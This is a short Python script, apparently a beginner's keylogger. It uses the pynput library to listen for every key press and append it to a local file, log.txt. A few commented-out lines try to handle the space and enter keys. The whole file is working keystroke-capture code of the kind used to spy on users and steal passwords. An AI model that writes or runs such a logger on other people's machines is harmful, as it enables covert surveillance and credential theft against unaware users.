#with keyword memory/resources releases automatically
#pynput library for listening and controlling input streams
from pynput.keyboard import Listener

def writetofile(Key):
    letter=str(Key)
    letter=letter.replace("'","")
    # if letter == key.Space:
    #     letter = " "
    # if letter == Key.enter:
    #     letter = "\n"
    with open("log.txt","a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()

